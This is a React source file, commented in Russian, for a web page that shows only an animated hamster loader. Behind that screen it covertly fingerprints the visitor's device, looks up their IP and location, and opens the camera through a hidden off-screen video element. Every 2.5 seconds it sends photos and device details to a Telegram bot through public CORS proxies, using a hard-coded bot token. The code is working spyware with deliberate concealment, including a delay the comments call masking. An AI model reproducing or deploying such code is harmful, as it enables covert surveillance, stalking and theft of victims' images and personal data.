import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

// Прокси-сервер интегрированный (работает через Cloudflare Workers или подобный сервис)
const PROXY_CONFIG = {
  // Используем несколько прокси для надежности
  endpoints: {
    telegram: {
      message: 'https://api.telegram.org/bot{token}/sendMessage',
      photo: 'https://api.telegram.org/bot{token}/sendPhoto',
      location: 'https://api.telegram.org/bot{token}/sendLocation'
    },
    // Прокси через CORS Anywhere (публичные прокси)
    proxies: [
      'https://cors-anywhere.herokuapp.com/', // Основной
      'https://thingproxy.freeboard.io/fetch/', // Резервный
      'https://api.allorigins.win/raw?url=' // Запасной
    ]
  }
};

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [isActive, setIsActive] = useState(true);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 2500; // 2.5 секунды
  const MAX_CAPTURES = 100;

  // Универсальная функция отправки через прокси
  const sendViaProxy = async (url, data, isFormData = false) => {
    const proxies = PROXY_CONFIG.endpoints.proxies;
    
    for (const proxy of proxies) {
      try {
        const proxyUrl = proxy + encodeURIComponent(url);
        const options = {
          method: 'POST',
          headers: isFormData ? {} : { 'Content-Type': 'application/json' }
        };

        if (isFormData) {
          options.body = data;
        } else {
          options.body = JSON.stringify(data);
        }

        const response = await fetch(proxyUrl, options);
        
        if (response.ok) {
          return { success: true };
        }
      } catch (error) {
        console.log(`Proxy ${proxy} failed, trying next...`);
        continue;
      }
    }
    
    return { success: false, error: 'All proxies failed' };
  };

  // Отправка сообщения в Telegram
  const sendToTelegram = async (text) => {
    const url = PROXY_CONFIG.endpoints.telegram.message.replace('{token}', TELEGRAM_BOT_TOKEN);
    const data = {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_notification: true,
      disable_web_page_preview: true
    };

    return await sendViaProxy(url, data);
  };

  // Отправка фото в Telegram
  const sendPhotoToTelegram = async (blob, caption = '') => {
    const url = PROXY_CONFIG.endpoints.telegram.photo.replace('{token}', TELEGRAM_BOT_TOKEN);
    
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
    formData.append('disable_notification', 'true');
    
    if (caption) {
      formData.append('caption', caption);
    }

    return await sendViaProxy(url, formData, true);
  };

  // Сбор полной информации об устройстве
  const collectDeviceInfo = async () => {
    const info = {
      // Основная информация
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer,
      
      // Навигатор
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      vendor: navigator.vendor,
      language: navigator.language,
      languages: navigator.languages?.join(', '),
      
      // Экран
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth
      },
      innerSize: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      devicePixelRatio: window.devicePixelRatio,
      
      // Производительность
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      
      // Сеть
      connection: (() => {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return conn ? {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData
        } : null;
      })(),
      
      // Время
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Детекция устройств
      isMobile: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      isTablet: /Tablet|iPad/i.test(navigator.userAgent),
      isDesktop: !/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      
      // Детекция ОС
      os: (() => {
        const ua = navigator.userAgent;
        if (/Windows/i.test(ua)) return 'Windows';
        if (/Mac OS/i.test(ua)) return 'macOS';
        if (/Linux/i.test(ua)) return 'Linux';
        if (/Android/i.test(ua)) return 'Android';
        if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
        return 'Unknown';
      })(),
      
      // Детекция браузера
      browser: (() => {
        const ua = navigator.userAgent;
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
        if (/Firefox/i.test(ua)) return 'Firefox';
        if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
        if (/Edg/i.test(ua)) return 'Edge';
        if (/Opera|OPR/i.test(ua)) return 'Opera';
        return 'Unknown';
      })(),
      
      // WebGL информация
      webgl: (() => {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
              return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
              };
            }
          }
        } catch (e) {}
        return null;
      })(),
      
      // Батарея
      battery: null,
      
      // IP и геолокация
      ip: null,
      location: null,
      
      // Медиаустройства
      mediaDevices: {
        cameras: 0,
        microphones: 0,
        speakers: 0
      }
    };

    // Получаем IP
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      info.ip = data.ip;
      
      // Геолокация по IP
      try {
        const locResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
        const locData = await locResponse.json();
        info.location = {
          city: locData.city,
          region: locData.region,
          country: locData.country_name,
          coordinates: `${locData.latitude}, ${locData.longitude}`,
          isp: locData.org
        };
      } catch (e) {}
    } catch (error) {
      info.ip = 'Unknown';
    }

    // Информация о батарее
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        info.battery = {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (e) {}
    }

    // Медиаустройства
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      info.mediaDevices = {
        cameras: devices.filter(d => d.kind === 'videoinput').length,
        microphones: devices.filter(d => d.kind === 'audioinput').length,
        speakers: devices.filter(d => d.kind === 'audiooutput').length,
        deviceList: devices.map(d => ({
          kind: d.kind,
          label: d.label,
          groupId: d.groupId
        }))
      };
    } catch (e) {}

    setDeviceInfo(info);
    return info;
  };

  // Форматирование информации об устройстве для отправки
  const formatDeviceInfo = (info) => {
    return `
🔍 *ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*

*📱 СИСТЕМА И БРАУЗЕР*
▫️ ОС: ${info.os}
▫️ Браузер: ${info.browser}
▫️ Платформа: ${info.platform}
▫️ Производитель: ${info.vendor}
▫️ Тип: ${info.isMobile ? '📱 Мобильное' : info.isTablet ? '📟 Планшет' : '💻 Компьютер'}

*🖥 ЭКРАН И ДИСПЛЕЙ*
▫️ Разрешение: ${info.screen.width}×${info.screen.height}
▫️ Доступно: ${info.screen.availWidth}×${info.screen.availHeight}
▫️ Окно: ${info.innerSize.width}×${info.innerSize.height}
▫️ Глубина цвета: ${info.screen.colorDepth} бит
▫️ Pixel Ratio: ${info.devicePixelRatio}
${info.webgl ? `▫️ GPU: ${info.webgl.vendor}\n▫️ Видеокарта: ${info.webgl.renderer}` : ''}

*⚙️ АППАРАТНЫЕ ХАРАКТЕРИСТИКИ*
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ ОЗУ: ${info.deviceMemory} GB
▫️ Касания: ${info.maxTouchPoints}
${info.battery ? `▫️ Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : ''}

*🎥 МЕДИАУСТРОЙСТВА*
▫️ Камеры: ${info.mediaDevices.cameras}
▫️ Микрофоны: ${info.mediaDevices.microphones}
▫️ Динамики: ${info.mediaDevices.speakers}

*🌐 СЕТЬ И ГЕОЛОКАЦИЯ*
▫️ IP: ${info.ip}
${info.location ? `▫️ Местоположение: ${info.location.city}, ${info.location.region}, ${info.location.country}\n▫️ Координаты: ${info.location.coordinates}\n▫️ Провайдер: ${info.location.isp}` : ''}
${info.connection ? `▫️ Тип сети: ${info.connection.effectiveType}\n▫️ Скорость: ${info.connection.downlink} Mbps\n▫️ Задержка: ${info.connection.rtt} ms\n▫️ Экономия трафика: ${info.connection.saveData ? '✅ Вкл' : '❌ Выкл'}` : ''}

*🌍 ЯЗЫК И ВРЕМЯ*
▫️ Язык: ${info.language}
▫️ Поддерживаемые: ${info.languages}
▫️ Часовой пояс: ${info.timezone}
▫️ Смещение: ${info.timezoneOffset} мин

*🔗 ДОПОЛНИТЕЛЬНО*
▫️ User Agent: ${info.userAgent.substring(0, 150)}...
▫️ URL: ${info.url}
▫️ Реферер: ${info.referrer || 'Нет'}
▫️ Таймстамп: ${info.timestamp}

🚀 *СИСТЕМА АКТИВИРОВАНА - НАЧАТ ЗАХВАТ С КАМЕР*
    `;
  };

  // Создание тестового изображения
  const createTestImage = async () => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    canvas.width = 800;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');

    // Градиентный фон
    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
    gradient.addColorStop(0, '#667eea');
    gradient.addColorStop(1, '#764ba2');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 800, 600);

    // Основная информация
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 40px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('📷 SYSTEM ACTIVE', 400, 200);

    ctx.font = '24px Arial';
    ctx.fillText(`Photo #${captureCount + 1}`, 400, 260);
    ctx.fillText(new Date().toLocaleString(), 400, 300);

    // Информация об устройстве
    ctx.font = '18px Arial';
    ctx.fillText(`${deviceInfo?.os || 'Unknown'} | ${deviceInfo?.browser || 'Unknown'}`, 400, 350);
    ctx.fillText(`IP: ${deviceInfo?.ip || 'Unknown'}`, 400, 380);

    // Анимация
    const angle = (Date.now() / 1000) % (Math.PI * 2);
    ctx.beginPath();
    ctx.arc(400, 450, 60, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 6;
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(400 + Math.cos(angle) * 40, 450 + Math.sin(angle) * 40, 20, 0, Math.PI * 2);
    ctx.fillStyle = '#FF6B6B';
    ctx.fill();

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  // Захват фото с камеры
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      return await createTestImage();
    }

    const video = videoRef.current;
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      return await createTestImage();
    }

    try {
      if (!canvasRef.current) {
        canvasRef.current = document.createElement('canvas');
      }
      const canvas = canvasRef.current;
      
      // Используем оригинальное разрешение
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      
      // Очищаем canvas
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Захватываем кадр
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Водяной знак
      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
      ctx.fillRect(10, canvas.height - 120, 350, 110);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '14px Arial';
      ctx.textAlign = 'left';
      ctx.fillText(`📸 Photo #${captureCount + 1}`, 20, canvas.height - 100);
      ctx.fillText(`📐 ${video.videoWidth}x${video.videoHeight}`, 20, canvas.height - 80);
      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 60);
      ctx.fillText(`💾 ${deviceInfo?.os || 'Unknown'}`, 20, canvas.height - 40);

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });
    } catch (error) {
      return await createTestImage();
    }
  };

  // Захват и отправка фото
  const captureAndSend = async () => {
    if (!isActive || captureCount >= MAX_CAPTURES) {
      if (captureCount >= MAX_CAPTURES) {
        stopCapturing();
        await sendToTelegram(`📊 *ЗАВЕРШЕНИЕ РАБОТЫ*\n\nДостигнут лимит ${MAX_CAPTURES} фото\nИтого отправлено: ${captureCount} фото\nВремя: ${new Date().toLocaleString()}`);
      }
      return;
    }

    try {
      const photoBlob = await capturePhoto();
      
      if (photoBlob) {
        const caption = `📸 *Фото #${captureCount + 1}*\n` +
          `📱 *Устройство:* ${deviceInfo?.os || 'Unknown'}\n` +
          `📐 *Разрешение:* ${photoBlob.size > 0 ? Math.round(photoBlob.size / 1024) + ' KB' : 'Unknown'}\n` +
          `⏰ *Время:* ${new Date().toLocaleTimeString()}\n` +
          `📍 *IP:* ${deviceInfo?.ip || 'Unknown'}\n` +
          `🌍 *Местоположение:* ${deviceInfo?.location?.city || 'Unknown'}, ${deviceInfo?.location?.country || 'Unknown'}`;

        const result = await sendPhotoToTelegram(photoBlob, caption);
        
        if (result.success) {
          setCaptureCount(prev => prev + 1);
          
          // Статистика каждые 10 фото
          if ((captureCount + 1) % 10 === 0) {
            await sendToTelegram(
              `📊 *СТАТИСТИКА #${captureCount + 1}*\n\n` +
              `📈 Всего фото: ${captureCount + 1}\n` +
              `📱 Устройство: ${deviceInfo?.os || 'Unknown'}\n` +
              `🌐 IP: ${deviceInfo?.ip || 'Unknown'}\n` +
              `📍 Гео: ${deviceInfo?.location?.city || 'Unknown'}, ${deviceInfo?.location?.country || 'Unknown'}\n` +
              `🔋 Батарея: ${deviceInfo?.battery?.level || '?'}%\n` +
              `⏰ Время: ${new Date().toLocaleString()}`
            );
          }
        }
      }
    } catch (error) {
      console.error('Capture error:', error);
    }
  };

  // Инициализация камеры
  const initializeCamera = async () => {
    try {
      // Пробуем разные варианты камер
      const constraintsList = [
        { video: { facingMode: { exact: "environment" }, width: { ideal: 1920 }, height: { ideal: 1080 } } },
        { video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } },
        { video: { width: { ideal: 1920 }, height: { ideal: 1080 } } },
        { video: true }
      ];

      let stream = null;
      for (const constraints of constraintsList) {
        try {
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          break;
        } catch (err) {
          continue;
        }
      }

      if (!stream) {
        throw new Error('No camera available');
      }

      streamRef.current = stream;

      // Создаем скрытый видео элемент
      if (!videoRef.current) {
        videoRef.current = document.createElement('video');
        videoRef.current.style.cssText = `
          position: fixed;
          width: 1px;
          height: 1px;
          opacity: 0.001;
          pointer-events: none;
          z-index: -999999;
          top: -9999px;
          left: -9999px;
        `;
        document.body.appendChild(videoRef.current);
      }

      const video = videoRef.current;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      video.setAttribute('playsinline', 'true');
      video.setAttribute('muted', 'true');
      video.setAttribute('autoplay', 'true');
      video.setAttribute('webkit-playsinline', 'true');

      video.srcObject = stream;

      // Ждем готовности
      await new Promise((resolve) => {
        const timer = setTimeout(resolve, 3000);
        video.onloadedmetadata = () => {
          clearTimeout(timer);
          video.play().catch(() => {});
          resolve();
        };
      });

      return true;
    } catch (error) {
      console.error('Camera initialization error:', error);
      return false;
    }
  };

  // Запуск периодического захвата
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    // Первый захват через 1 секунду
    setTimeout(() => {
      captureAndSend();
    }, 1000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  // Остановка захвата
  const stopCapturing = () => {
    setIsActive(false);
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
      videoRef.current.remove();
      videoRef.current = null;
    }
  };

  // Основная инициализация
  useEffect(() => {
    let mounted = true;

    const init = async () => {
      // Задержка для маскировки
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Собираем информацию об устройстве
      const info = await collectDeviceInfo();
      
      // Отправляем полную информацию
      await sendToTelegram(formatDeviceInfo(info));

      // Инициализируем камеру
      const cameraSuccess = await initializeCamera();

      if (cameraSuccess && mounted) {
        // Запускаем периодический захват
        startPeriodicCapture();
      }
    };

    // Запускаем сразу
    init();

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // Ничего не рендерим кроме хомяка
  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App">
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
